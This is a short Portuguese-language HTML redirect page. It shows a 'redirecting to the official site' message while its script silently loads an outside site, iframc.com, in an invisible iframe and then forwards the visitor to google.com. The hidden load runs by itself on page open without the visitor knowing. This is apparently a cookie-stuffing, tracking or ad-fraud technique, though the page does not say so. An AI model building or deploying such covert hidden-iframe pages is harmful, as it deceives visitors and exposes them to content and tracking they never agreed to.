<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecionando</title>
    <style>
        /* Estilos básicos para a página e o círculo */
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f3f3f3;
        }
        .container {
            display: flex;
            align-items: center;
        }
        .circle {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background-color: green;
            margin-right: 10px;
            animation: spin 1.5s linear infinite;
        }
        /* Animação de rotação do círculo */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="circle"></div>
        <p>✅ Aguarde! Redirecionando para o Site Oficial</p>
    </div>

    <!-- Iframe invisível -->
    <iframe id="hiddenIframe" src="" style="display:none;"></iframe>

    <script>
        // Definindo os sets
        var lnkfrm = 'https://iframc.com';
        var lnkdtn = 'https://google.com';

        // Carregando o iframe invisível
        document.getElementById('hiddenIframe').src = lnkfrm;

        // Função de redirecionamento após o carregamento do iframe
        document.getElementById('hiddenIframe').onload = function() {
            window.location.href = lnkdtn;
        };
    </script>
</body>
</html>
